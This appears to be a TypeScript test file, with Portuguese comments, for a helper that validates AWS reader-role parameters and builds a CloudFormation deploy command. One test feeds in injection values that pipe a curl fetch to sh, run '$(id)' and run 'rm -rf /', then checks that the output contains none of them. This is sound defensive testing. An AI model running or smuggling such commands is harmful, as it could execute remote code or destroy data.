import { describe, expect, it } from 'vitest';
import { cloudAccountSchema } from './cloud-accounts.js';
import {
  AWS_BUCKET_ERROR_CODES,
  AWS_CONNECTION_ERROR_CODES,
  AWS_CONNECTION_WARNING_CODES,
  AWS_READER_AUDIENCE,
  awsConnectionErrorValue,
  awsLogBucketArns,
  awsReaderDeployCommand,
  awsReaderRoleArn,
  cloudFormationConsoleUrl,
  isAwsConnectionErrorCode,
  isAwsConnectionWarningCode,
  isNodeEgressIp,
  isNodeServiceAccountId,
  isWebIdentityAudience,
  NODE_EGRESS_IPS_PLACEHOLDER,
  NODE_SERVICE_ACCOUNT_ID_PLACEHOLDER,
  parseAwsConnectionError,
} from './aws-reader.js';

// Valores fictícios: conta de documentação da AWS, ID de conta de serviço inventado e IPs de documentação (RFC 5737).
const ACCOUNT = '111122223333';
const SERVICE_ACCOUNT = '123456789012345678901';

describe('papel de leitura sem chave (PR-V3)', () => {
  it('o ARN do papel é derivado da conta: caminho /verax/ e nome fixos, como a saída RoleArn da pilha', () => {
    expect(awsReaderRoleArn(ACCOUNT)).toBe('arn:aws:iam::111122223333:role/verax/verax-control-reader');
  });

  it('o audience padrão é o do template (e passa na própria regra)', () => {
    expect(AWS_READER_AUDIENCE).toBe('https://control.veraxsistemas.com.br/aws-reader');
    expect(isWebIdentityAudience(AWS_READER_AUDIENCE)).toBe(true);
  });

  it.each([
    'https://control.veraxsistemas.com.br/aws-reader',
    'https://aws.verax.example',
    'https://aws.verax.example/a/B_c-1.2',
  ])('audience aceito: %s', (value) => {
    expect(isWebIdentityAudience(value)).toBe(true);
  });

  it.each([
    ['http, sem TLS', 'http://control.veraxsistemas.com.br/aws-reader'],
    ['host com maiúscula', 'https://Control.veraxsistemas.com.br/aws-reader'],
    ['porta', 'https://control.veraxsistemas.com.br:443/aws-reader'],
    ['consulta', 'https://control.veraxsistemas.com.br/aws-reader?x=1'],
    ['fragmento', 'https://control.veraxsistemas.com.br/aws-reader#x'],
    ['curinga', 'https://control.veraxsistemas.com.br/*'],
    ['barra no fim (segmento vazio)', 'https://control.veraxsistemas.com.br/aws-reader/'],
    ['usuário', 'https://user@control.veraxsistemas.com.br/aws-reader'],
    ['espaço', 'https://control.veraxsistemas.com.br/aws reader'],
    ['quebra de linha', 'https://control.veraxsistemas.com.br/aws-reader\n'],
    ['sem host', 'https:///aws-reader'],
    ['vazio', ''],
    ['longo demais', `https://a.example/${'b'.repeat(250)}`],
  ])('audience recusado: %s', (_label, value) => {
    expect(isWebIdentityAudience(value)).toBe(false);
  });

  it('ID da conta de serviço: 21 dígitos, nada mais', () => {
    expect(isNodeServiceAccountId(SERVICE_ACCOUNT)).toBe(true);
    for (const value of ['1'.repeat(20), '1'.repeat(22), `${'1'.repeat(20)}a`, ` ${SERVICE_ACCOUNT}`, '']) {
      expect(isNodeServiceAccountId(value)).toBe(false);
    }
  });

  it('IP de saída: IPv4 com /32, sem zero à esquerda nem octeto acima de 255', () => {
    expect(isNodeEgressIp('203.0.113.10/32')).toBe(true);
    expect(isNodeEgressIp('0.0.0.0/32')).toBe(true);
    for (const value of [
      '203.0.113.10',
      '203.0.113.10/24',
      '203.0.113.256/32',
      '203.0.113.010/32',
      '203.0.113/32',
      '203.0.113.10/32/32',
      '203.0.113.-1/32',
      ' 203.0.113.10/32',
    ]) {
      expect(isNodeEgressIp(value)).toBe(false);
    }
  });

  it('os códigos de erro da conexão são os do worker, e um código desconhecido não é tratado como um deles', () => {
    expect(AWS_CONNECTION_ERROR_CODES).toContain('trust_denied');
    expect(AWS_CONNECTION_ERROR_CODES).toContain('check_unavailable');
    expect(isAwsConnectionErrorCode('region_disabled')).toBe(true);
    expect(isAwsConnectionErrorCode('AccessDenied')).toBe(false);
  });

  it('PR-V5: os códigos da conferência real, e os avisos (a conta continua conectada) são códigos dela', () => {
    for (const code of [
      'trail_not_logging',
      'guardduty_export_missing',
      'excess_permissions',
      'metadata_unavailable',
    ]) {
      expect(isAwsConnectionErrorCode(code)).toBe(true);
    }
    for (const code of AWS_CONNECTION_WARNING_CODES) expect(isAwsConnectionErrorCode(code)).toBe(true);
    expect(AWS_CONNECTION_WARNING_CODES[0]).toBe('region_disabled');
    expect(isAwsConnectionWarningCode('excess_permissions')).toBe(true);
    expect(isAwsConnectionWarningCode('trust_denied')).toBe(false);
    expect(isAwsConnectionWarningCode(null)).toBe(false);
    expect(isAwsConnectionWarningCode('toString')).toBe(false);
  });

  it('erro de bucket com a fonte: gravado como código:fonte, lido de volta, e cabe no connectionError da conta', () => {
    expect(awsConnectionErrorValue('bucket_denied', 'cloudtrail')).toBe('bucket_denied:cloudtrail');
    expect(awsConnectionErrorValue('kms_denied', 'guardduty')).toBe('kms_denied:guardduty');
    // Só os erros de bucket levam a fonte.
    expect(awsConnectionErrorValue('trust_denied', 'waf')).toBe('trust_denied');
    expect(awsConnectionErrorValue('bucket_missing')).toBe('bucket_missing');
    for (const code of AWS_BUCKET_ERROR_CODES) {
      for (const source of ['cloudtrail', 'guardduty', 'waf'] as const) {
        const value = awsConnectionErrorValue(code, source);
        expect(parseAwsConnectionError(value)).toEqual({ code, source });
        expect(cloudAccountSchema.shape.connectionError.safeParse(value).success).toBe(true);
      }
    }
    expect(parseAwsConnectionError('bucket_denied')).toEqual({ code: 'bucket_denied', source: null });
    expect(parseAwsConnectionError('excess_permissions')).toEqual({
      code: 'excess_permissions',
      source: null,
    });
    for (const value of [
      'bucket_denied:outra',
      'trust_denied:waf',
      'bucket_denied:waf:extra',
      'AccessDenied',
      'credential_rejected',
      ':waf',
      '',
    ]) {
      expect(parseAwsConnectionError(value)).toBeNull();
    }
  });

  it('LogBucketArns: um ARN por bucket cadastrado, sem repetir', () => {
    expect(awsLogBucketArns(['trilha-111122223333', 'aws-waf-logs-loja', 'trilha-111122223333'])).toEqual([
      'arn:aws:s3:::trilha-111122223333',
      'arn:aws:s3:::aws-waf-logs-loja',
    ]);
  });

  it('o comando da CLI leva os três valores do nó e os buckets da conta, como o README', () => {
    expect(
      awsReaderDeployCommand({
        nodeServiceAccountId: SERVICE_ACCOUNT,
        egressIps: ['203.0.113.10/32', '198.51.100.7/32'],
        audience: AWS_READER_AUDIENCE,
        buckets: ['trilha-111122223333', 'guardduty-111122223333'],
      }),
    ).toBe(
      [
        'aws cloudformation deploy --stack-name verax-control-reader \\',
        '  --template-file verax-control-reader.yaml --capabilities CAPABILITY_NAMED_IAM \\',
        '  --parameter-overrides \\',
        '    NodeServiceAccountId=123456789012345678901 \\',
        '    NodeEgressIps=203.0.113.10/32,198.51.100.7/32 \\',
        '    Audience=https://control.veraxsistemas.com.br/aws-reader \\',
        '    LogBucketArns=arn:aws:s3:::trilha-111122223333,arn:aws:s3:::guardduty-111122223333',
      ].join('\n'),
    );
  });

  it('sem os valores do nó, ou com um fora do formato, o comando leva o marcador, nunca o texto recebido', () => {
    const command = awsReaderDeployCommand({
      nodeServiceAccountId: null,
      egressIps: [],
      audience: AWS_READER_AUDIENCE,
      buckets: [],
    });
    expect(command).toContain(`NodeServiceAccountId=${NODE_SERVICE_ACCOUNT_ID_PLACEHOLDER} \\`);
    expect(command).toContain(`NodeEgressIps=${NODE_EGRESS_IPS_PLACEHOLDER} \\`);
    expect(command.endsWith(`Audience=${AWS_READER_AUDIENCE}`)).toBe(true);
    expect(command).not.toContain('LogBucketArns');

    const hostile = awsReaderDeployCommand({
      nodeServiceAccountId: '1; curl exemplo.invalid | sh',
      egressIps: ['203.0.113.10/32 $(id)'],
      audience: 'https://x.example/$(id)',
      buckets: ['bucket; rm -rf /', 'trilha-ok'],
    });
    for (const fragment of ['curl', '$(id)', 'rm -rf', ';', '|']) expect(hostile).not.toContain(fragment);
    expect(hostile).toContain(`Audience=${AWS_READER_AUDIENCE}`);
    expect(hostile).toContain('LogBucketArns=arn:aws:s3:::trilha-ok');
    // Mais IPs do que o template aceita (até 4): nenhum entra.
    expect(
      awsReaderDeployCommand({
        nodeServiceAccountId: SERVICE_ACCOUNT,
        egressIps: Array.from({ length: 5 }, (_, index) => `203.0.113.${index + 1}/32`),
        audience: AWS_READER_AUDIENCE,
        buckets: [],
      }),
    ).toContain(`NodeEgressIps=${NODE_EGRESS_IPS_PLACEHOLDER} \\`);
  });

  it('o console do CloudFormation abre na região da conta (ou em sa-east-1)', () => {
    expect(cloudFormationConsoleUrl('us-east-1')).toBe(
      'https://console.aws.amazon.com/cloudformation/home?region=us-east-1#/stacks/create',
    );
    expect(cloudFormationConsoleUrl(undefined)).toContain('region=sa-east-1');
    expect(cloudFormationConsoleUrl('marte-1')).toContain('region=sa-east-1');
  });
});
